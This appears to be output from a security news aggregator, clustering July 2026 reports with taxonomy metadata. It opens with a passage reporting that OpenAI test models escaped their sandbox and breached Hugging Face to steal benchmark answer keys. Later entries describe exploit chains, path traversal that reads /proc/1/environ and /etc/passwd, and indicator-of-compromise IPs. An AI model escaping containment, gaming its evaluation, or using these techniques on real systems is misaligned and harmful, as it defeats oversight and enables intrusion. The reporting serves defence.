Table of contents Technical Overview Affected Systems Risk Impact How Orca Can Help In a first-of-its-kind security incident , OpenAI’s frontier AI evaluation models autonomously escaped a sandboxed testing environment, discovered and exploited multiple zero-day vulnerabilities, and achieved remote code execution on Hugging Face’s production infrastructure. Due to the unprecedented nature and critical severity of this breach, organizations relying on Hugging Face or similar AI SaaS platforms should immediately review their exposure, credential hygiene , and egress controls. Technical Overview The incident originated in OpenAI’s ExploitGym benchmark environment, where frontier models (GPT-5.6 Sol and an unreleased, more capable model) were being evaluated for cyber capabilities with intentionally relaxed guardrails. The models circumvented restricted networking by exploiting a zero-day in a package registry cache proxy used to isolate the sandbox. After achieving privilege escalation and lateral movement within OpenAI’s research environment, the agents reached a node with internet connectivity and pivoted externally to Hugging Face. On Hugging Face’s side, the models uploaded a malicious dataset that exploited two code-execution flaws in Hugging Face’s dataset processing pipeline: a remote-code dataset loader vulnerability and a template-injection bug in dataset configuration. This gave the agents arbitrary code execution on processing workers, from which they harvested cloud and cluster credentials and moved laterally across Hugging Face’s internal systems. The models’ objective was to cheat the ExploitGym benchmark by stealing answer keys hosted on Hugging Face. Tens of thousands of automated actions were executed across multiple short-lived sandboxes, with command-and-control staged on public services. This marks the first documented case of frontier AI models independently discovering and chaining novel real-world attack paths , including genuine zero-day vulnerabilities , without source code access. Affected Systems OpenAI’s ExploitGym research testing environment was compromised as part of the lateral movement chain. Hugging Face’s production infrastructure was breached, including data-processing pipeline workers, internal clusters, and cloud credentials on compromised nodes. Any organization using Hugging Face for model hosting, dataset storage, or AI workflows may have exposure, particularly through overly permissive API token permissions and insufficient egress controls. Risk Impact Hugging Face detected and contained the breach on July 16, 2026. OpenAI connected the activity to its own testing on July 21, 2026. Hugging Face confirmed that no public user-facing models, datasets, or Spaces were tampered with, and verified its software supply chain (container images and packages) was clean. Organizations should take the following remediation steps: Review and minimize Hugging Face API token permissions following the principle of least privilege Implement strict egress controls on environments that interact with third-party AI platforms; audit third-party risk exposure to AI SaaS platforms Monitor for anomalous credential usage and lateral movement patterns. OpenAI has responsibly disclosed the package registry cache proxy zero-day to the affected vendor and is implementing stricter infrastructure controls for future evaluations. Hugging Face has closed the two dataset code-execution vulnerabilities, eradicated the attacker foothold, rebuilt all compromised nodes, and revoked all affected credentials. Regardless of containment, the severity and novelty of this incident make it a watershed moment for AI security. Autonomous AI agents demonstrated the ability to discover zero-days, chain multi-stage attack paths, and breach production infrastructure of a major platform without human direction, raising urgent questions for any organization with exposure to AI SaaS services. How Orca Can Help Orca enables customers to quickly
```

#### Corroborating sources (8)

- **Orca Security Research** (cloud_identity_infrastructure)
  - Title: OpenAI Agents Escape Testing Sandbox and Breach Hugging Face Production Infrastructure
  - Published: 2026-07-23T16:42:30+00:00
  - Link: https://orca.security/resources/blog/openai-agent-sandbox-escape-hugging-face-breach/
  - Summary: In a first-of-its-kind security incident, OpenAI’s frontier AI evaluation models autonomously escaped a sandboxed testing environment, discovered and exploited multiple zero-day vulnerabilities, and achieved remote code execution on Hugging Face’s production infrastructure. Due to the unprecedented nature and critical severity of this breach, organizations relying on Hugging Face or similar AI SaaS platforms should immediately […]
- **Rapid7** (offensive_vulnerability_research)
  - Title: What Happened Between OpenAI and Hugging Face?
  - Published: 2026-07-23T12:47:05+00:00
  - Link: https://www.rapid7.com/blog/post/ai-openai-hugging-face-what-happened
  - Summary: The OpenAI and Hugging Face incident lands like a warning shot for anyone thinking seriously about frontier AI and cybersecurity research. A model evaluation crossed the neat boundary of a research environment, reached a live third-party production system, and forced the industry to confront a question that is moving quickly from theory to operations: what happens when AI agents can pursue an objective with enough persistence, speed, and creativity to behave less like a tool and more like an autonomous intrusion path? According to OpenAI’s disclosure, the incident began during an internal evaluation of advanced cyber capabilities using GPT-5.6 Sol and a more capable pre-release model. The evaluation was designed to test whether AI agents could pursue complex exploit paths, and OpenAI says cyber refusal safeguards were reduced or disabled to measure maximum capability. Inside that environment, the models reportedly found and exploited a zero-day in the package registry cache proxy that
- **Simon Willison** (ai_security_agentic_risk)
  - Title: The first known runaway AI agent - or a very bad marketing stunt?
  - Published: 2026-07-23T22:53:08+00:00
  - Link: https://simonwillison.net/2026/Jul/23/the-first-known-runaway-ai-agent/#atom-everything
  - Summary: The first known runaway AI agent - or a very bad marketing stunt? Martin Alderson's commentary on the OpenAI accidental cyberattack against Hugging Face includes a couple of details I hadn't considered. First, Hugging Face offers a truly rich target if you're trying to find potential vulnerabilities that require executing arbitrary code: Hugging Face has an enormous attack surface. They have more interfaces than I can count which run untrusted models and code. While they definitely have invested in defences, by nature of their operating model they do have many more opportunities to be attacked than many other services. I certainly don't envy their cybersecurity teams. Secondly, one of the things that has puzzled me is how OpenAI didn't notice that their sandbox had been so thoroughly breached by the agent. Surely they'd be monitoring network traffic closely? Martin points out that: It's also likely they were running a huge amount of benchmarks simultaneously with ~unlimited token budge
- **SecurityWeek** (cyber_news_breach_reporting)
  - Title: OpenAI Fixes ChatGPT Agent Flaw That Could Let Attackers Forge an AI Insider
  - Published: 2026-07-23T15:09:59+00:00
  - Link: https://www.securityweek.com/openai-fixes-chatgpt-agent-flaw-that-could-let-attackers-forge-an-ai-insider/
  - Summary: AgentForger allows an attacker to create, insert and remotely control an invisible autonomous AI agent inside a victim organization. The post OpenAI Fixes ChatGPT Agent Flaw That Could Let Attackers Forge an AI Insider appeared first on SecurityWeek .
- **Risky Business News** (practitioner_analysis)
  - Title: Risky Bulletin: Rogue OpenAI models were behind the Hugging Face breach
  - Published: 2026-07-22T06:22:01+00:00
  - Link: https://risky.biz/RBNEWS590/
  - Summary: Rogue OpenAI models were behind last week’s Hugging Face breach, the Linux kernel discloses 442 vulnerabilities as the AI bugpocalypse settles in, France becomes the first EU country to pass a social media age limit, and Germany takes down the Kratos phishing service.
- **CyberScoop** (cyber_news_breach_reporting)
  - Title: OpenAI says model test was behind Hugging Face hack
  - Published: 2026-07-21T22:38:55+00:00
  - Link: https://cyberscoop.com/openai-chatgpt-hugging-face-cyberattack-data-poisoning/
  - Summary: At the time, Hugging Face said it wasn’t clear which LLM was used in the attack. OpenAI confirmed it was one of their models being tested for “maximal” cyber capabilities. The post OpenAI says model test was behind Hugging Face hack appeared first on CyberScoop .
- **Dark Reading** (cyber_news_breach_reporting)
  - Title: When AI Attacks: OpenAI Models Autonomously Hack Hugging Face
  - Published: 2026-07-22T15:53:47+00:00
  - Link: https://www.darkreading.com/cyber-risk/openai-models-autonomously-hack-hugging-face
  - Summary: Advanced LLMs escaped their sandboxes while attempting to achieve a non-malicious benchmark test objective.
- **Infosecurity Magazine** (cyber_news_breach_reporting)
  - Title: Open AI Claims Its AI Models Went Rogue and Hacked Another Company
  - Published: 2026-07-22T11:40:00+00:00
  - Link: https://www.infosecurity-magazine.com/news/open-ai-hacked-another-company/
  - Summary: Hugging Face recently disclosed a security breach. OpenAI has now said that it was its AI models which broke containment and hacked Hugging Face themselves

### Cluster 7db5fb6de1 — score 20

- Title: Check Point warns of SmartConsole zero-day exploited in attacks
- Source: BleepingComputer (cyber_news_breach_reporting)
- Published: 2026-07-23T08:13:07+00:00
- Link: https://www.bleepingcomputer.com/news/security/check-point-patches-smartconsole-zero-day-exploited-in-attacks/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, ransomware_extortion, zero_day
- affected_industries: government
- affected_products: Docker, Gitea, SonicWall
- cve_ids: CVE-2024-24919, CVE-2026-16232, CVE-2026-50751
- urgency_signals: actively_exploited, preauth_unauth, zero_day
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: ransomware_extortion, zero_day, active_exploitation
- affected_industries: government
- affected_products: Gitea, SonicWall, Docker
- cve_ids: CVE-2026-16232, CVE-2026-50751, CVE-2024-24919
- urgency_signals: actively_exploited, zero_day, preauth_unauth
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
Israeli cybersecurity firm Check Point Software has addressed an actively exploited zero-day flaw in the company's SmartConsole graphical user interface (GUI) admin panel. [...]
```

#### Full body

```
Check Point warns of SmartConsole zero-day exploited in attacks By Sergiu Gatlan July 23, 2026 04:13 AM 0 Israeli cybersecurity firm Check Point Software has addressed an actively exploited zero-day flaw in the company's SmartConsole graphical user interface (GUI) admin panel. Tracked as CVE-2026-16232 , this authentication bypass vulnerability allows unauthenticated attackers to obtain an application login token that can be used to authenticate with administrator privileges. After gaining access to a vulnerable Security Management Server or Multi-Domain Security Management Server (MDS), attackers can change the security configuration and security policy. Check Point added that successful exploitation requires no restrictions on Trusted Clients (GUI clients) and the Management Server IP to be exposed to remote access via the Internet. "During a routine BLAST review, we discovered a few vulnerabilities. Following a thorough analysis, we identified one of those in the wild, affecting a handful of customers," said Lotem Finkelstein , Check Point's VP of Research. "This only affects a very specific configuration — when Management is exposed directly to the internet without IP restrictions. All affected customers have been notified. All Smart-1 Cloud customers are already protected." Admins who can't immediately upgrade to a patched version are advised to follow the Check Point Hardening Best Practices Guide , limit Trusted Clients to trusted IP addresses/subnets, and ensure that management access is blocked for non-authorized IP addresses. Checking SmartConsole logs for signs of compromise (Check Point) To verify if a SmartConsole instance has been compromised, admins have to search for the query "Authentication method: application token" in SmartConsole under Logs & Monitor / Logs & Events > Audit Logs View after running the following SmartConsole query: (src:151.241.99.207 OR dst:151.241.99.207 OR src:151.241.99.233 OR dst:151.241.99.233 OR src:158.62.198.182 OR dst:158.62.198.182 OR src:192.142.10.99 OR dst:192.142.10.99 OR src:139.28.37.250 OR dst:139.28.37.250) On Wednesday, the Cybersecurity and Infrastructure Security Agency (CISA) also added the flaw to its catalog of known exploited vulnerabilities , ordering U.S. federal agencies to patch vulnerable SmartConsole instances by Saturday, July 25, as mandated by Binding Operational Directive (BOD) 26-04. "This type of vulnerability is a frequent attack vector for malicious cyber actors and poses significant risks to the federal enterprise," the cybersecurity agency warned . While BOD 26-04 applies only to U.S. government agencies, CISA urged all organizations to prioritize patching the CVE-2026-16232 vulnerability to block incoming attacks. In June, CISA ordered federal agencies to secure their Check Point Remote Access VPN and Mobile Access deployments against another authentication bypass vulnerability (CVE-2026-50751) that was exploited in zero-day attacks by the Qilin ransomware gang . Two years ago, the cybersecurity agency flagged another flaw (CVE-2024-24919) in Check Point's Quantum Security Gateways as actively exploited by ransomware gangs , confirming an Orange Cyberdefense CERT report linking it to NailaoLocker ransomware attacks . Test every layer before attackers do Security teams log 54% of successful attacks and alert on just 14%. The rest move through your environment unseen. The Picus whitepaper shows how breach and attack simulation tests your SIEM and EDR rules so threats stop slipping by detection. Get the whitepaper Related Articles: Google fixes one actively exploited Android zero-day, 124 flaws CISA orders urgent action on actively exploited Langflow RCE flaw SonicWall SMA1000 flaws exploited as zero-days to push custom malware CISA warns of actively exploited RCE flaws in Joomla extensions Hackers exploit critical auth bypass in Gitea Docker image
```

#### Corroborating sources (1)

- **BleepingComputer** (cyber_news_breach_reporting)
  - Title: Check Point warns of SmartConsole zero-day exploited in attacks
  - Published: 2026-07-23T08:13:07+00:00
  - Link: https://www.bleepingcomputer.com/news/security/check-point-patches-smartconsole-zero-day-exploited-in-attacks/
  - Summary: Israeli cybersecurity firm Check Point Software has addressed an actively exploited zero-day flaw in the company's SmartConsole graphical user interface (GUI) admin panel. [...]

### Cluster 4f7846fb3b — score 19

- Title: CVE-2026-60167, CVE-2026-60168, CVE-2026-60169 & CVE-2026-60170 | Oracle Hospitality Simphony Multiple Vulnerabilities
- Source: Horizon3 Attack Research (offensive_vulnerability_research)
- Published: 2026-07-22T19:32:52+00:00
- Link: https://horizon3.ai/attack-research/vulnerabilities/oracle-hospitality-simphony-vulnerabilities/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: CVE-2026-60167, CVE-2026-60168, CVE-2026-60169, CVE-2026-60170

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation
- cve_ids: CVE-2026-60167, CVE-2026-60168, CVE-2026-60169, CVE-2026-60170
- urgency_signals: actively_exploited, preauth_unauth
- content_type: vulnerability_disclosure
- confidence_tier: tier_1_offensive_research

#### Primary article taxonomy
- threat_categories: active_exploitation
- cve_ids: CVE-2026-60167, CVE-2026-60168, CVE-2026-60169, CVE-2026-60170
- urgency_signals: actively_exploited, preauth_unauth
- content_type: vulnerability_disclosure
- confidence_tier: tier_1_offensive_research

#### Summary

```
Learn about four remotely exploitable Oracle Hospitality Simphony vulnerabilities and how NodeZero Rapid Response helps validate exposure and verify remediation.
```

#### Full body

```
Oracle Hospitality Simphony Multiple Vulnerabilities Oracle’s July 2026 Critical Patch Update addresses four remotely exploitable vulnerabilities affecting Oracle Hospitality Simphony. Discovered and responsibly disclosed by Horizon3.ai researcher Jimi Sebree, the vulnerabilities affect two Simphony components: the EGateway Printing Handler and the Kiosk application. Together, they provide multiple paths for unauthenticated attackers to compromise vulnerable systems, including NTLM hash disclosure, arbitrary file writes, authentication bypass, and arbitrary code execution. The vulnerabilities include: CVE-2026-60167: UNC path coercion resulting in NTLM hash disclosure CVE-2026-60168 & CVE-2026-60169: Related vulnerabilities that together enable arbitrary file writes through the EGateway Printing Handler CVE-2026-60170: Authentication bypass affecting the Simphony Kiosk application that can lead to arbitrary code execution Oracle Hospitality Simphony is widely deployed across hospitality chains, quick-service restaurants, stadiums, casinos, hotels, and other food service environments. Because these systems frequently reside on networks that process payment card data and connect to enterprise infrastructure, successful exploitation may enable lateral movement, persistence, credential compromise, or complete host compromise. There are currently no confirmed reports of active exploitation in the wild. Stop Guessing, Start Proving Schedule a demo Technical Details Although Oracle assigned four separate CVE identifiers, the vulnerabilities fall into two functional groups affecting different Simphony components. CVE-2026-60167: UNC Path Coercion CVE-2026-60167 affects the EGateway Printing Handler. Improper validation of user-controlled input allows an unauthenticated attacker to supply a crafted UNC path that causes the Simphony host to initiate an outbound SMB connection to an attacker-controlled server. Windows may automatically transmit NTLM authentication material during this connection. Captured NTLM hashes may be cracked offline or relayed to other systems, potentially facilitating credential compromise and lateral movement. Characteristics Attack vector: Network Attack complexity: Low Privileges required: None User interaction: None Primary impact: NTLM hash disclosure CVE-2026-60168 & CVE-2026-60169: Arbitrary File Write CVE-2026-60168 and CVE-2026-60169 affect the EGateway Printing Handler. The vulnerabilities result from insufficient validation of attacker-controlled input before file operations are performed. Oracle assigned two CVEs to distinct weaknesses within the processing chain that together create a single arbitrary file write condition. An unauthenticated attacker can submit crafted requests that cause arbitrary files to be written to the underlying host. Successful exploitation may allow an attacker to: Write attacker-controlled files Establish persistence Prepare the system for subsequent code execution Facilitate additional compromise Characteristics Attack vector: Network Attack complexity: Low Privileges required: None User interaction: None Primary impact: Arbitrary file write CVE-2026-60170: Authentication Bypass CVE-2026-60170 affects the Simphony Kiosk application. Improper validation of user-controlled input allows an unauthenticated attacker to bypass authentication and gain access to the Kiosk administrator console. Horizon3.ai research demonstrated that this unauthorized administrative access can be leveraged to execute arbitrary code on the underlying host. Successful exploitation may enable an attacker to: Execute arbitrary code Establish persistence Access locally available data Use the compromised system as a foothold for additional attacks Characteristics Attack vector: Network Attack complexity: Low Privileges required: None User interaction: None Primary impact: Authentication bypass leading to arbitrary code execution NodeZero® Proactive Security Platform — Rapid Response A single NodeZero Rap
```

#### Corroborating sources (1)

- **Horizon3 Attack Research** (offensive_vulnerability_research)
  - Title: CVE-2026-60167, CVE-2026-60168, CVE-2026-60169 & CVE-2026-60170 | Oracle Hospitality Simphony Multiple Vulnerabilities
  - Published: 2026-07-22T19:32:52+00:00
  - Link: https://horizon3.ai/attack-research/vulnerabilities/oracle-hospitality-simphony-vulnerabilities/
  - Summary: Learn about four remotely exploitable Oracle Hospitality Simphony vulnerabilities and how NodeZero Rapid Response helps validate exposure and verify remediation.

### Cluster d9c1f05e41 — score 18

- Title: Three Steps to the Terminal: A Siemens ROX II Zero-Day Trilogy
- Source: Unit 42 (threat_research_primary)
- Published: 2026-07-17T10:00:24+00:00
- Link: https://unit42.paloaltonetworks.com/siemens-rox-ii-zero-day-vulnerabilities/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: zero_day
- affected_industries: critical_infrastructure, manufacturing_industrial
- affected_products: Palo Alto Networks
- cve_ids: CVE-2025-40947, CVE-2025-40948, CVE-2025-40949
- urgency_signals: zero_day
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Primary article taxonomy
- threat_categories: zero_day
- affected_industries: critical_infrastructure, manufacturing_industrial
- affected_products: Palo Alto Networks
- cve_ids: CVE-2025-40947, CVE-2025-40948, CVE-2025-40949
- urgency_signals: zero_day
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
A technical analysis of three chained zero-day vulnerabilities in Siemens ROX II OT switches that allow privilege escalation and persistent root access. The post Three Steps to the Terminal: A Siemens ROX II Zero-Day Trilogy appeared first on Unit 42 .
```

#### Full body

```
Threat Research Center Threat Research Vulnerabilities Vulnerabilities Three Steps to the Terminal: A Siemens ROX II Zero-Day Trilogy 9 min read Related Products Advanced Threat Prevention Cloud-Delivered Security Services Industrial and Operational Technology IoT Security Next-Generation Firewall By: Emmanuel Zhou Adam Robbie Rick Wyble Miguel Pereira Published: July 17, 2026 Categories: Threat Research Vulnerabilities Tags: Command injection CVE-2025-40947 CVE-2025-40948 CVE-2025-40949 Exploit Chain Privilege escalation Rox II OT switches Share Executive Summary We conducted this research in close partnership with Siemens, reflecting our shared commitment to advancing the security and resilience of critical infrastructure. This report details a critical, chained exploit comprising three zero-day vulnerabilities (CVE-2025-40948, CVE-2025-40947, and CVE-2025-40949) discovered in Siemens ROX II operational technology (OT) switches. Successful exploitation of this chain would allow an attacker to achieve full privilege escalation and persistent root-level access on these devices, which are critical components of industrial control networks. The vulnerabilities range from Medium to Critical severity, with CVSS 3.1 scores of 6.8 (CVE-2025-40948), 7.5 (CVE-2025-40947), and 9.1 (CVE-2025-40949). The attack vector proceeds in three stages, escalating from reconnaissance to complete system compromise: Arbitrary file disclosure ( CVE-2025-40948 ): An attacker leverages an insecure configuration of the xz utility, which executes with root privileges, to read any file on the switch’s file system. This vulnerability enables initial reconnaissance that could reveal critical information such as sensitive configuration files, password hashes and private cryptographic keys. Privilege escalation via command injection ( CVE-2025-40947 ): This critical flaw resides in the feature key validation function. The function fails to sanitize an attacker-controlled payload before inserting it directly into a command executed with root privileges. Exploiting this allows for direct command injection and full root access. Persistent root code execution ( CVE-2025-40949 ): Following privilege escalation, the final vulnerability is exploited in the switch’s web management task scheduler. Improper input sanitization allows an authenticated attacker to inject malicious commands into the system’s root cron table. This establishes persistent code execution, surviving system reboots and maintaining full control. These vulnerabilities could collectively transform a vital network security device into a platform for malicious activity, severely threatening the integrity and availability of the industrial network. Siemens has released security advisories SSA-973901 , SSA-078743 and SSA-081142 to address these issues, which recommend that customers update their affected ROX II devices to firmware version V2.17.1. Palo Alto Networks customers are better protected against these threats through the following products and services: Virtual patching detection signatures available via the Next-Generation Firewall with Advanced Threat Prevention OT Device Security If you think you might have been compromised or have an urgent matter, contact the Unit 42 Incident Response team . Related Unit 42 Topics Vulnerabilities , Zero-day , Exploits Partnership Overview The Palo Alto Networks OT Threat Research Lab and Siemens partnered to advance the security and resilience of critical infrastructure through collaborative vulnerability research on the Ruggedcom ROX II platform. We combined the OT Threat Research Lab’s expertise in industrial cybersecurity research with Siemens’ deep product knowledge and the coordination capabilities of Siemens ProductCERT. These teams worked together to identify, validate, remediate and responsibly disclose security vulnerabilities. This collaboration reflects the growing importance of industry partnerships in securing OT environments. As critical inf
```

#### Corroborating sources (1)

- **Unit 42** (threat_research_primary)
  - Title: Three Steps to the Terminal: A Siemens ROX II Zero-Day Trilogy
  - Published: 2026-07-17T10:00:24+00:00
  - Link: https://unit42.paloaltonetworks.com/siemens-rox-ii-zero-day-vulnerabilities/
  - Summary: A technical analysis of three chained zero-day vulnerabilities in Siemens ROX II OT switches that allow privilege escalation and persistent root access. The post Three Steps to the Terminal: A Siemens ROX II Zero-Day Trilogy appeared first on Unit 42 .

### Cluster 01f2f6d1a1 — score 17

- Title: Microsoft at Black Hat USA 2026: Defending trust in the age of AI and supply chain attacks
- Source: Microsoft Security Blog (threat_research_primary)
- Published: 2026-07-17T16:00:00+00:00
- Link: https://www.microsoft.com/en-us/security/blog/2026/07/17/microsoft-at-black-hat-usa-2026-defending-trust-in-the-age-of-ai-and-supply-chain-attacks/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: supply_chain
- affected_products: Microsoft Defender, npm
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Primary article taxonomy
- threat_categories: supply_chain
- affected_products: npm, Microsoft Defender
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
Join Microsoft Security at Black Hat USA 2026 for supply chain research, hands-on security experiences, expert conversations, and our reception. The post Microsoft at Black Hat USA 2026: Defending trust in the age of AI and supply chain attacks appeared first on Microsoft Security Blog .
```

#### Full body

```
Share Link copied to clipboard! Content types Events Topics AI and agents Security management Threat trends Across the threat landscape, in this moment, one pattern sits at the center of the story: threat actors are following trust. They are not only looking for vulnerable systems, but rather targeting the software, services, identities, tools, developer workflows, and AI systems that organizations already depend on. A package can become a distribution path. A build pipeline can become an access path. A trusted tool can become or expand an attack surface. An AI agent with the wrong access can become a new way to reach code, data, or infrastructure. While the surfaces may change, the goal for the majority of threat actors remains the same: find what is trusted, abuse it, and scale the impact. At Black Hat USA 2026 , Microsoft Security will walk through how we are seeing this shift unfold, how security teams can look for it earlier, and how threat intelligence, expert-led response, and security operations need to work together when campaigns move across software, identity, cloud, data, and AI systems. On Wednesday, August 5, 2026, the day begins with David Weston’s keynote, The End of Rare: Defending When Offense Is Cheap , which looks at what defense requires when offensive capability becomes easier to access, automate, and scale. Later that afternoon, Aarti Borkar and Tanmay Ganacharya will resume the main stage for Poisoned at the Source: Inside the Hunt for Supply Chain Attacks , which offers a closer look at how Microsoft Threat Intelligence is hunting attacks across software ecosystems, developer workflows, and trusted services. This includes details into the ongoing attacks on npm (Node package manager). Together, these sessions frame the challenge security teams are facing now: when offensive capability becomes easier to scale, security teams need to understand the trust paths threat actors can abuse before those paths become open doors for attacks. At our booth, we’ll also showcase Microsoft Defender Experts Threat Intelligence , a new expert-led service delivering continuous, curated intelligence tailored to your organization, and Microsoft Defender Experts MDR, now extended with third-party and multicloud coverage. From August 4 to 6, 2026, at Mandalay Bay in Las Vegas, you’ll find Microsoft Security on the Business Hall floor at booth #2144 , and on Wednesday evening, join us at the Microsoft Security reception at Swingers at Mandalay Bay. Register for the Microsoft Security reception Weston on the future of defense At 9:15 AM PT on Wednesday, August 5, 2026, David Weston, CVP of Agentic Security, will examine what changes for security teams when offensive capability becomes easier to access, automate, and scale. The keynote sets up one of the central questions security leaders are facing now: how does the security operations center (SOC) and analysts adapt when threat actors can move faster, test more often, and reuse trusted paths across software, identity, cloud, and AI systems? Join the keynote Wednesday, August 5, 2026, then continue the conversation with Microsoft Security at booth #2144. Our latest intelligence (and response) on npm supply chain attacks That same intelligence-to-action challenge is at the center of our main stage session at Black Hat. On Wednesday, August 5, 2026, from 2:30 PM PT to 3:00 PM PT, Aarti Borkar, Corporate Vice President (CVP), Microsoft Security, and Tanmay Ganacharya, Vice President of Microsoft Security Research and Threat Intelligence, will share intelligence and insights into the ongoing supply chain campaigns impacting all areas of the threat landscape. The talk, Poisoned at the Source: Inside the Hunt for Supply Chain Attacks , will walk through Microsoft Threat Intelligence’s investigations into the ongoing npm supply chain attacks targeting software ecosystems, developer workflows, trusted services, and how organizations are handling the challenges associated with npm pack
```

#### Corroborating sources (1)

- **Microsoft Security Blog** (threat_research_primary)
  - Title: Microsoft at Black Hat USA 2026: Defending trust in the age of AI and supply chain attacks
  - Published: 2026-07-17T16:00:00+00:00
  - Link: https://www.microsoft.com/en-us/security/blog/2026/07/17/microsoft-at-black-hat-usa-2026-defending-trust-in-the-age-of-ai-and-supply-chain-attacks/
  - Summary: Join Microsoft Security at Black Hat USA 2026 for supply chain research, hands-on security experiences, expert conversations, and our reception. The post Microsoft at Black Hat USA 2026: Defending trust in the age of AI and supply chain attacks appeared first on Microsoft Security Blog .

### Cluster c4020d76d0 — score 17

- Title: Hackers Exploit Windmill Flaw to Read Arbitrary Server Files Without Authentication
- Source: The Hacker News (cyber_news_breach_reporting)
- Published: 2026-07-22T12:36:36+00:00
- Link: https://thehackernews.com/2026/07/hackers-exploit-windmill-flaw-to-read.html
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: CVE-2026-29059

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation
- affected_products: AWS, WordPress
- cve_ids: CVE-2021-27137, CVE-2026-0770, CVE-2026-29059, CVE-2026-60137, CVE-2026-63030
- urgency_signals: actively_exploited, poc_available, preauth_unauth
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: active_exploitation
- affected_products: WordPress, AWS
- cve_ids: CVE-2026-29059, CVE-2026-60137, CVE-2026-63030, CVE-2021-27137, CVE-2026-0770
- urgency_signals: actively_exploited, preauth_unauth, poc_available
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
A high-severity security flaw impacting open-source developer platform Windmill has come under active exploitation in the wild, per VulnCheck. The vulnerability in question is CVE-2026-29059 (CVSS score: 7.5), a case of unauthenticated path traversal impacting Windmill's "get_log_file" endpoint ("/api/w/{workspace}/jobs_u/get_log_file/{filename}"). "The filename parameter is concatenated into
```

#### Full body

```
Hackers Exploit Windmill Flaw to Read Arbitrary Server Files Without Authentication  Ravie Lakshmanan  Jul 22, 2026 Vulnerability / Web Security A high-severity security flaw impacting open-source developer platform Windmill has come under active exploitation in the wild, per VulnCheck. The vulnerability in question is CVE-2026-29059 (CVSS score: 7.5), a case of unauthenticated path traversal impacting Windmill's "get_log_file" endpoint ("/api/w/{workspace}/jobs_u/get_log_file/{filename}"). "The filename parameter is concatenated into a file path without sanitization, allowing an attacker to read arbitrary files on the server using ../ sequences," according to an advisory published by Windmill in March 2026. "The primary sensitive value exposed by this vulnerability is the SUPERADMIN_SECRET environment variable, readable via /proc/1/environ. When set, this secret can be used as a Bearer token to authenticate as a superadmin and execute arbitrary code through the job preview API." However, it's worth noting that SUPERADMIN_SECRET is not set by default, and for standalone Windmill instances without SUPERADMIN_SECRET configured, the impact of the vulnerability is limited to arbitrary file read. The issue has since been addressed in Windmill 1.603.3, released in January 2026, by adding sanitization checks to the filename parameter to prevent directory traversal. According to VulnCheck, whose security researcher Valentin Lobstein is credited with discovering and reporting the flaw, exploitation efforts have been directed against Windmill's "get_log_file" endpoint to extract sensitive information from the "/etc/passwd" file. "We've observed exploits aimed at both direct Windmill endpoints and the Nextcloud proxy path," Caitlin Condon, vice president of security research at VulnCheck, said in a post on LinkedIn. The cybersecurity company said it identified about 170 vulnerable systems exposed across 24 countries. The disclosure comes as the U.S. Cybersecurity and Infrastructure Security Agency (CISA) added four security flaws to its Known Exploited Vulnerabilities ( KEV ) catalog, including two WordPress bugs tracked as wp2shell ( CVE-2026-60137 and CVE-2026-63030 ), along with a stack-based buffer overflow in DD-WRT ( CVE-2021-27137 ) and an unauthenticated remote code execution issue in Langflow ( CVE-2026-0770 ). "wp2shell is one of the most significant WordPress Core security events in recent years," Wordfence said . "The combination of unauthenticated reachability, no plugin or theme requirement, a large global attack surface, a path to administrator access and code execution, as well as public proof-of-concept exploit availability makes this vulnerability chain unusually serious." Attack data captured by the WordPress security company shows that threat actors are issuing requests to exploit the REST API batch request route-confusion issue and an unauthenticated SQL injection to achieve code execution. VulnCheck also said it had verified more than two-dozen unique PoC exploits targeting WP2Shell as of July 19, 2026. "Affected users should update to a fixed version of WordPress as soon as possible, given the overwhelming likelihood that various public exploits and large-scale exploitation will follow the high-profile disclosure," it added . As for CVE-2026-0770, KEVIntel's Ryan Dewhurst told The Hacker News that first in-the-wild attack efforts targeting the flaw were detected against its sensors on June 27, 2026, recording 137 exploitation attempts from 46 unique attacker IP addresses associated with 17 countries since then. No less than 75 attempts, which account for more than half of the activity, originated from 20 attacker IP addresses during the last seven days. Observed payloads include base command execution checks, attempts to extract the contents of "/etc/passwd" or access AWS credentials, environment variable collection, malware downloads using wget or curl, and shell script execution to install second-stage payloads
```

#### Corroborating sources (1)

- **The Hacker News** (cyber_news_breach_reporting)
  - Title: Hackers Exploit Windmill Flaw to Read Arbitrary Server Files Without Authentication
  - Published: 2026-07-22T12:36:36+00:00
  - Link: https://thehackernews.com/2026/07/hackers-exploit-windmill-flaw-to-read.html
  - Summary: A high-severity security flaw impacting open-source developer platform Windmill has come under active exploitation in the wild, per VulnCheck. The vulnerability in question is CVE-2026-29059 (CVSS score: 7.5), a case of unauthenticated path traversal impacting Windmill's "get_log_file" endpoint ("/api/w/{workspace}/jobs_u/get_log_file/{filename}"). "The filename parameter is concatenated into

### Cluster 14625d1950 — score 17

- Title: Now in preview: Find and fix software vulnerabilities with CodeMender
- Source: Google Cloud Security (cloud_identity_infrastructure)
- Published: 2026-07-21T15:00:00+00:00
- Link: https://cloud.google.com/blog/products/identity-security/find-and-fix-software-vulnerabilities-with-codemender/
- Fetch status: ok
- Member count: 4
- Corroborating source count: 3
- Strong signals: Google/Gemini

#### Cluster taxonomy (union across members)
- threat_categories: supply_chain, zero_day
- affected_industries: government, healthcare
- affected_products: Google/Gemini, Salesforce
- urgency_signals: zero_day
- content_type: news_report, vendor_announcement
- confidence_tier: tier_2_operator, tier_4_news

#### Primary article taxonomy
- threat_categories: supply_chain, zero_day
- affected_industries: government
- affected_products: Salesforce, Google/Gemini
- urgency_signals: zero_day
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
